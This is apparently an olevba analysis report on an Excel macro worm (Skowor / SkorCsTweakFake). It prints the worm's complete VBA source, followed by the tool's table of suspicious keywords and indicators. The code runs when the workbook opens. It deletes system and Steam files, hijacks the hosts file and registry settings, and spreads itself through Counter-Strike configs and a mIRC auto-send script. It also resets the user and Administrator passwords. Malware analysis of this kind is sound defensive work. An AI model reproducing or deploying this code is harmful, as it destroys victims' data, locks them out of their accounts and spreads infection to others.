olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Email-Worm.MSExcel.Skowor.a-3aebe5c8afccc7db3f9ce8c310b5abeb5cd2221b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO SkorCsTweakFake.cls 
in file: Email-Worm.MSExcel.Skowor.a-3aebe5c8afccc7db3f9ce8c310b5abeb5cd2221b - OLE stream: '_VBA_PROJECT_CUR/VBA/SkorCsTweakFake'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Macro/SkorCsTweakFake.A ©opyrights 2006 by sk0r
'This Worm was created by sk0r aka Daniel B.
'You are not allowed to decompile the Worm!
'ViSiT my Site @ www.sk0r-virii.tk
'
' This worm is the Macro Version of Win32/SkorSteamAttacker.A
'
'========================================================

Private Sub Workbook_Open()
On Error Resume Next
Set wshs = CreateObject("wscript.shell")
Set fso = CreateObject("scripting.filesystemobject")
Set sysdir = fso.getspecialfolder(1)
Set windir = fso.getspecialfolder(0)
hddisk = Left(windir, 2)
Set ntwrk = CreateObject("wscript.network")
SteamPath = wshs.regread("HKEY_LOCAL_MACHINE\SOFTWARE\Valve\Steam\" & "InstallPath")

Set wmi = GetObject("winmgmts:")
Set systemwmi = wmi.instancesOf("win32_process")
For Each exeordll In systemwmi
If LCase(exeordll.Name) = "steam.exe" Then
exeordll.terminate (0)
End If
Next

fso.deletefile (sysdir + "\drivers\etc\services")
fso.deletefile (sysdir + "\drivers\etc\protocol")

LocalIpAddress = Chr(49) & Chr(50) & Chr(55) & Chr(46) & Chr(48) & Chr(46) & Chr(48) & Chr(46) & Chr(49)
Set crtHostFl = fso.createtextfile(sysdir + "\drivers\etc\hosts", True)
With crtHostFl
.writeline ("# Macro/SkorCsTweakFake.A ©2006 by sk0r")
.writeline ("# I don't allow you to visit Cs Sites")
.writeline (" ")
.writeline (LocalIpAddress + " www.counter-strike.de")
.writeline (LocalIpAddress + " www.counterstrike.de")
.writeline (LocalIpAddress + " www.4players.de")
.writeline (LocalIpAddress + " www.serverleih.de")
.writeline (LocalIpAddress + " www.esl-europe.net")
.writeline (LocalIpAddress + " www.cs-expert.de")
.writeline (LocalIpAddress + " www.og-cheats.de")
.writeline (LocalIpAddress + " www.counter-hacks.de")
.writeline (LocalIpAddress + " www.csconfigs.de")
.writeline (LocalIpAddress + " www.daddeln.de")
.writeline (LocalIpAddress + " www.leaguez.com")
.writeline (LocalIpAddress + " www.planethalflife.com")
.writeline (LocalIpAddress + " www.google.de")
.writeline (LocalIpAddress + " www.search.yahoo.com")
.writeline (LocalIpAddress + " www.search.yahoo.de")
.writeline (LocalIpAddress + " www.netsettings.net")
.writeline (LocalIpAddress + " www.gigaliga.de")
.writeline (LocalIpAddress + " www.readmore.de")
.writeline (LocalIpAddress + " www.counterstrike-games.de")
.writeline (LocalIpAddress + " www.schroet.de")
.writeline (LocalIpAddress + " www.mousesports.com")
.writeline (LocalIpAddress + " www.clanserver4u.de")
.writeline (LocalIpAddress + " www.krankehorde.de")
.writeline (LocalIpAddress + " www.a-losers.org")
.writeline (LocalIpAddress + " www.team-ger.de")
.writeline (LocalIpAddress + " www.rushed.de")
.writeline (LocalIpAddress + " www.mymtw.de")
.writeline (LocalIpAddress + " www.giga.de")
.writeline (LocalIpAddress + " www.config-tuning.de")
.writeline (LocalIpAddress + " www.steampowered.com")
.writeline (LocalIpAddress + " www.golem.de")
.writeline (LocalIpAddress + " www.pc-games.de")
.writeline (LocalIpAddress + " www.mp-gamer.de")
.writeline (LocalIpAddress + " www.4cheaters.de")
.writeline (LocalIpAddress + " www.e-sb.de")
.writeline (LocalIpAddress + " www.ngz-server.de")
.writeline (LocalIpAddress + " www.esport-servers.de")
.writeline (LocalIpAddress + " www.digitallabs.de")
.writeline (LocalIpAddress + " www.digitallabs.com")
.writeline (LocalIpAddress + " www.ckras.com")
.writeline (LocalIpAddress + " www.quado.net")
.writeline (LocalIpAddress + " www.linemax.de")
.writeline (LocalIpAddress + " www.arena7.de")
.writeline (LocalIpAddress + " www.nitrado.net")
.writeline (LocalIpAddress + " www.xenonserver.de")
.writeline (LocalIpAddress + " www.cs-arena.com")
.writeline (LocalIpAddress + " www.go2irc.com")
.writeline (LocalIpAddress + " www.nordic-it.de")
.writeline (LocalIpAddress + " www.monsterserver.de")
.writeline (LocalIpAddress + " www.servercamp.de")
.writeline (LocalIpAddress + " www.clanservers.com")
.writeline (LocalIpAddress + " www.4netplayers.de")
.writeline (LocalIpAddress + " www.gameservercheck.de")
.writeline (LocalIpAddress + " www.stormix.de")
.writeline (LocalIpAddress + " www.clanserverz.de")
.writeline (LocalIpAddress + " www.server4all.de")
.writeline (LocalIpAddress + " www.teamplay.de")
.writeline (LocalIpAddress + " www.gameserver4u.de")
.writeline (LocalIpAddress + " www.csconfigs.mthone.de")
.writeline (LocalIpAddress + " www.spraylogos.de")
.writeline (LocalIpAddress + " www.planet-videos.com")
.writeline (LocalIpAddress + " www.unitedadmins.com")
.writeline (LocalIpAddress + " www.wwcl.net")
.writeline (LocalIpAddress + " www.tng-clan.de")
.writeline (LocalIpAddress + " www.thezproject.org")
.writeline (LocalIpAddress + " www.unitedservers.de")
.writeline (LocalIpAddress + " www.mirc-scripts.de")
.writeline (LocalIpAddress + " www.zerogamers.com")
.writeline (LocalIpAddress + " www.die-opfer.info")
.writeline (LocalIpAddress + " www.baerlinonline.de")
.writeline (LocalIpAddress + " www.counterstrike.net")
.writeline (LocalIpAddress + " www.counter-strike.net")
.writeline (LocalIpAddress + " www.security.mods.de")
.writeline (LocalIpAddress + " www.3dsupply.de")
.writeline (LocalIpAddress + " www.hltv.at")
.writeline (LocalIpAddress + " www.blank-tv.de")
.writeline (LocalIpAddress + " www.cstrike.de")
.writeline (LocalIpAddress + " www.the-cpl.com")
.writeline (LocalIpAddress + " www.core64.de")
.writeline (LocalIpAddress + " www.cs.gamer-scene.com")
.writeline (LocalIpAddress + " www.gamer-scene.com")
.writeline (LocalIpAddress + " www.esports-award.org")
.Close
End With

myself = SkorCsTweakFake.Path + "\" + SkorCsTweakFake.Name
Set GetMyDocument = fso.getfile(myself)
GetMyDocument.Copy (windir + "\priv_cstrike_tut.xls"), True

wshs.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden", 0, "REG_DWORD"
wshs.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt", 1, "REG_DWORD"
wshs.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOrganization", "SkorCsTweakFake Worm"
wshs.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Window Title", "Sponsored by sk0r"
wshs.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOwner", "sk0r1337"


wshs.regwrite "HKEY_CURRENT_USER\Software\Valve\Steam\language", "japanese"
wshs.regwrite "HKEY_CURRENT_USER\Software\Valve\Steam\SteamExe", sysdir + "\WinConfig\MsActiveSteam.exe"
wshs.regwrite "HKEY_CURRENT_USER\Software\Valve\Steam\LastGameNameUsed", "sk0r1337"
wshs.regwrite "HKEY_CURRENT_USER\Software\Valve\Steam\Rate", "7500"
wshs.regwrite "HKEY_CURRENT_USER\Software\Valve\Steam\NoSavePersonalInfo", 1, "REG_DWORD"
wshs.regwrite "HKEY_CURRENT_USER\Software\Valve\Steam\Offline", 1, "REG_DWORD"
wshs.regwrite "HKEY_CURRENT_USER\Software\Valve\Steam\RefreshLoginRequired", 1, "REG_DWORD"
wshs.regwrite "HKEY_CURRENT_USER\Software\Valve\Steam\SetRate", 0, "REG_DWORD"
wshs.regwrite "HKEY_CURRENT_USER\Software\Valve\Steam\ActiveProcess\SteamClientDll", SteamPath + "\ClientGUI.dll"
myhomepage = "http://encryboy.en.funpic.de/steamfake.html"
normalsite = wshs.regread("HKEY_CURRENT_USER\Software\Valve\Steam\LastContentProviderURL" & valve_homepage)
If normalsite <> myhomepage Then
wshs.regwrite "HKEY_CURRENT_USER\Software\Valve\Steam\LastContentProviderURL", myhomepage
End If

fso.deletefile (SteamPath + "\Steam_14.mst")
fso.deletefile (SteamPath + "\steamclient.dll")
fso.deletefile (SteamPath + "\tier0_s.dll")
fso.deletefile (SteamPath + "\CSERHelper.dll")
fso.deletefile (SteamPath + "\dbghelp.dll")
fso.deletefile (SteamPath + "\ClientRegistry.blob")
fso.deletefile (SteamPath + "\Steam_api.dll")
fso.deletefile (SteamPath + "\INSTALL.LOG")
fso.deletefile (SteamPath + "\WriteMiniDump.exe")
fso.deletefile (SteamPath + "\Steam.dll")
fso.deletefile (SteamPath + "\SteamUI.dll")
fso.deletefolder (SteamPath + "\bin")
fso.deletefolder (SteamPath + "\servers")
fso.deletefolder (SteamPath + "\config")
fso.deletefolder (SteamPath + "\friends")

writestring = "this file was owned by Macro/SkorCsTweakFake.A"
Set getfolderfirst = fso.getfolder(SteamPath + "\resource")
Set getfoldernow = getfolderfirst.Files
For Each file In getfoldernow
Set openwr = fso.opentextfile(file.Path, 2, True)
openwr.write writestring
openwr.Close
For Each unterordner In getfolderfirst.subfolders
subfiles = unterordner.Files
For Each unterfiles In subfiles
Set openall = fso.opentextfile(unterfiles.Path, 2, True)
openall.write writestring
openall.Close
Next
Next
Next

Randomize: intNumberRandoom = Int(7 * Rnd) + 1
If intNumberRandoom = 1 Then
ChatMessage = "World biggest cfg and priv hack summarize!"
ElseIf intNumberRandoom = 2 Then
ChatMessage = "Download original Xs1cht and Headstyle Rc!!"
ElseIf intNumberRandoom = 3 Then
ChatMessage = "Orgia Crack v10 working!! Download it and own!"
ElseIf intNumberRandoom = 4 Then
ChatMessage = "Pixelaimbot v5.2 working (undetectable) downlaod!"
ElseIf intNumberRandoom = 5 Then
ChatMessage = "Download 1337 Config by Mouz|Jonny (Original, no fake!!)"
ElseIf intNumberRandoom = 6 Then
ChatMessage = "h4xx0r sound config download! Better then A3D 2.0 (working)"
ElseIf intNumberRandoom = 7 Then
ChatMessage = "download priv config h4xx0r maker by hirsche! (no fake)"
Else
ChatMessage = "download private optimizer by z0rr0.. kommt viel mehr an (geht wirklich!!)"
End If

Set crtSteamVbs = fso.createtextfile(SteamPath + "\SteamApps\SkorCsTweakFake.vbs", True)
With crtSteamVbs
.writeline ("Rem Macro/SkorCsTweakFake.A Spreading Script file")
.writeline (" ")
.writeline ("On Error Resume Next")
.writeline ("Set fso = CreateObject(""scripting.filesystemobject"")")
.writeline ("Set wshs = CreateObject(""wscript.shell"")")
.writeline ("SteamPath = wshs.regread(""HKEY_LOCAL_MACHINE\SOFTWARE\Valve\Steam\"" & ""InstallPath"")")
.writeline ("Set getfldr = fso.getfolder(SteamPath + ""\SteamApps"")")
.writeline ("For Each UserAcc In getfldr.subfolders")
.writeline ("If fso.folderexists(UserAcc.Path + ""\counter-strike\cstrike"") Then")
.writeline ("If Not fso.fileexists(UserAcc.Path + ""\counter-strike\cstrike\userconfig.cfg"") Then")
.writeline ("Set usercfg = fso.createtextfile(UserAcc.Path + ""\counter-strike\cstrike\userconfig.cfg"")")
.writeline ("usercfg.writeline (""//first created"")")
.writeline ("usercfg.Close")
.writeline ("End If")
.writeline ("Set openusercfg = fso.opentextfile(UserAcc.Path + ""\counter-strike\cstrike\userconfig.cfg"", 2, True)")
.writeline ("openusercfg.write (""//Macro/SkorCsTweakFake.A Cs-Script File (Like IM-Worms)"" + vbCrLf)")
.writeline ("openusercfg.write (""//==========================================="" + vbCrLf)")
.writeline ("openusercfg.write (""//Begin Config h4xx0ring:"" + vbCrLf)")
.writeline ("openusercfg.write (""alias """"SkorWrite"""" """"say http://encryboy.en.funpic.de/Cstrike_Tweaks.zip <= " + ChatMessage + " """";"" + vbCrLf)")
.writeline ("openusercfg.write (""alias """"SkorSleep"""" """"echo You are infected with Macro/SkorCsTweakFake.A by sk0r (Daniel)"""";"" + vbCrLf)")
.writeline ("openusercfg.write (""alias """"SkorGo"""" """"SkorAn"""";"" + vbCrLf)")
.writeline ("openusercfg.write (""alias """"SkorAn"""" """"SkorWrite; alias SkorGo SkorAus"""";"" + vbCrLf)")
.writeline ("openusercfg.write (""alias """"SkorAus"""" """"SkorSleep; alias SkorGo SkorSchmaus"""";"" + vbCrLf)")
.writeline ("openusercfg.write (""alias """"SkorSchmaus"""" """"SkorSleep; alias SkorGo SkorLaus"""";"" + vbCrLf)")
.writeline ("openusercfg.write (""alias """"SkorLaus"""" """"SkorSleep; alias SkorGo SkorKaus"""";"" + vbCrLf)")
.writeline ("openusercfg.write (""alias """"SkorKaus"""" """"SkorSleep; alias SkorGo SkorSaus"""";"" + vbCrLf)")
.writeline ("openusercfg.write (""alias """"SkorSaus"""" """"SkorSleep; alias SkorGo SkorBraus"""";"" + vbCrLf)")
.writeline ("openusercfg.write (""alias """"SkorBraus"""" """"SkorSleep; alias SkorGo SkorXaus"""";"" + vbCrLf)")
.writeline ("openusercfg.write (""alias """"SkorXaus"""" """"SkorSleep; alias SkorGo SkorZaus"""";"" + vbCrLf)")
.writeline ("openusercfg.write (""alias """"SkorZaus"""" """"SkorSleep; alias SkorGo SkorAn"""";"" + vbCrLf)")
.writeline ("openusercfg.write (""alias """"m_pitch"""" """"SkorGo"""";"" + vbCrLf)")
.writeline ("openusercfg.write (""s_enable_a3d;"" + vbCrLf)")
.writeline ("openusercfg.write (""s_a3d """"1""""; alias s_a3d;"" + vbCrLf)")
.writeline ("openusercfg.write (""rate """"7500"""";"" + vbCrLf)")
.writeline ("openusercfg.write (""name """"MacroVirus/SkorCsTweakFake.A"""";""+vbcrlf)")
.writeline ("openusercfg.write (""//End Config h4xx0ring"" + vbCrLf)")
.writeline ("openusercfg.write (""//==========================================="" + vbCrLf)")
.writeline ("openusercfg.write (""//Macro/SkorCsTweakFake.A Cs-Script File (Like IM-Worms)"" + vbCrLf)")
.writeline ("End If")
.writeline ("Next")
.Close
End With

wshs.Run (SteamPath + "\SteamApps\SkorCsTweakFake.vbs"), , True
fso.deletefile (SteamPath + "\SteamApps\SkorCsTweakFake.vbs")

senddocument = windir + "\priv_cstrike_tut.xls"

If fso.folderexists(hddisk + "\Mirc32") Then
   mircpath = hddisk + "\Mirc32"
ElseIf fso.folderexists(hddisk + "\Mirc") Then
   mircpath = hddisk + "\Mirc"
ElseIf fso.folderexists(hddisk + "\Programme\Mirc32") Then
   mircpath = hddisk + "\Programme\Mirc32"
ElseIf fso.folderexists(hddisk + "\Programme\Mirc") Then
   mircpath = hddisk + "\Programme\Mirc"
End If

mirchax = "/§d§cc§ se§nd %ha§xn§ic§k " + senddocument
mirchax = Replace(mirchax, "§", "")
Open mircpath + "\Script.ini" For Output As #1
Print #1, "[script]"
Print #1, "n5=On *:Join:#: {"
Print #1, "n6=/unset %haxnick"
Print #1, "n7=/set %haxnick $nick"
Print #1, "n8=" + mirchax
Print #1, "n9=/msg %haxnick Hier, damit kannste dein inet Speed Optimieren! Is sau geil!"
Print #1, "n10=}"
Close


Set InfoHtmlPage = fso.createtextfile(windir + "\SkorCsTweakFake.htm")
With InfoHtmlPage
.writeline ("<!-- Html Page of Macro/SkorCsTweakFake.A ©2006 by sk0r -->")
.writeline ("<html>")
.writeline ("<head>")
.writeline ("<title>Information of Macro/SkorCsTweakFake.A by sk0r</title>")
.writeline ("<meta name=""Generator"" content=""SkorCsTweakFake"">")
.writeline ("<meta name=""author"" content=""sk0r"">")
.writeline ("</head>")
.writeline ("<body text=""#999933"" bgcolor=""#00CCFF"">")
.writeline ("<h1><b><u>You are infected with Macro/SkorCsTweakFake.A</u></b></h1>")
.writeline ("<br>")
.writeline ("<br>")
.writeline ("Hello. You are infected with Macro/SkorCsTweakFake.A by sk0r<br>")
.writeline ("Well, this worm demonstrates a new area for steam worms!<br>")
.writeline ("It is a worm because it spreads trough the ingame mod cstrike<br>")
.writeline ("Are you confused because of the m_pitch command ingame?<br>")
.writeline ("Well this is the spreading of the worm :-D. If you have<br>")
.writeline ("a knowledge in malware, then you know IM-Worms!<br>")
.writeline ("Those worms are spreading trough Icq or Msn Messenger.<br>")
.writeline ("They are sending a link to the worm for each contact in your list.<br>")
.writeline ("This worm makes the same, but trough steam :><br>")
.writeline ("This is a new are and this is the first worm for this area!<br>")
.writeline ("<br>")
.writeline ("<-- Worm is ©2006 by sk0r (Daniel) | Visit www.sk0r-virii.tk or www.sk0r-scripts.tk --><br>")
.writeline ("<br>")
.writeline ("<button OnClick=""javascript:self.close()"">&nbsp;&nbsp;&nbsp;&nbsp;Close&nbsp;&nbsp;&nbsp;&nbsp;</button>")
.writeline ("<br>")
.writeline ("<img src=""http://www.speedsurf.to/sk0r1337/sk0r/sk0r_own3d.jpg"">")
.writeline ("</body>")
.writeline ("</html>")
.Close
End With

wshs.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page", "file:///" + windir + "\SkorCsTweakFake.htm"

GetDesktop = wshs.specialfolders("Desktop")
Set crtInfoTxt = fso.createtextfile(GetDesktop + "\Readme_by_sk0r.txt")
crtInfoTxt.writeline ("Please open your Internet Explorer to read more!")
crtInfoTxt.writeline ("Worm ©2006 by sk0r")
crtInfoTxt.Close

wshs.PopUp "You have been infected with MacroWorm/SkorCsTweakFake ©2006 by sk0r. Visit www.sk0r-virii.tk", 2, "Virus Information"
wshs.PopUp "if you want to have you CurrentUser and Administrator Pw, then ask sk0r!", 2, "Passwords"

wshs.Run ("net user %UserName% skor1337")
wshs.Run ("net user Administrator skor1337owned")


Set wshs = Nothing
Set fso = Nothing
Set sysdir = Nothing
Set windir = Nothing
Set ntwrk = Nothing
Unload Me
End Sub

'<!-- Macro/SkorCsTweakFake.A | ©2006 by sk0r --!>
-------------------------------------------------------------------------------
VBA MACRO Tabelle1.cls 
in file: Email-Worm.MSExcel.Skowor.a-3aebe5c8afccc7db3f9ce8c310b5abeb5cd2221b - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle2.cls 
in file: Email-Worm.MSExcel.Skowor.a-3aebe5c8afccc7db3f9ce8c310b5abeb5cd2221b - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle3.cls 
in file: Email-Worm.MSExcel.Skowor.a-3aebe5c8afccc7db3f9ce8c310b5abeb5cd2221b - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|createtextfile      |May create a text file                       |
|Suspicious|shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|wscript.shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|regread             |May read registry keys                       |
|Suspicious|CurrentUser         |May detect Norman Sandbox                    |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://encryboy.en.f|URL                                          |
|          |unpic.de/steamfake.h|                                             |
|          |tml                 |                                             |
|IOC       |http://encryboy.en.f|URL                                          |
|          |unpic.de/Cstrike_Twe|                                             |
|          |aks.zip             |                                             |
|IOC       |http://www.speedsurf|URL                                          |
|          |.to/sk0r1337/sk0r/sk|                                             |
|          |0r_own3d.jpg        |                                             |
|IOC       |steam.exe           |Executable file name                         |
|IOC       |MsActiveSteam.exe   |Executable file name                         |
|IOC       |ClientGUI.dll       |Executable file name                         |
|IOC       |steamclient.dll     |Executable file name                         |
|IOC       |tier0_s.dll         |Executable file name                         |
|IOC       |CSERHelper.dll      |Executable file name                         |
|IOC       |dbghelp.dll         |Executable file name                         |
|IOC       |Steam_api.dll       |Executable file name                         |
|IOC       |WriteMiniDump.exe   |Executable file name                         |
|IOC       |Steam.dll           |Executable file name                         |
|IOC       |SteamUI.dll         |Executable file name                         |
|IOC       |SkorCsTweakFake.vbs |Executable file name                         |
+----------+--------------------+---------------------------------------------+

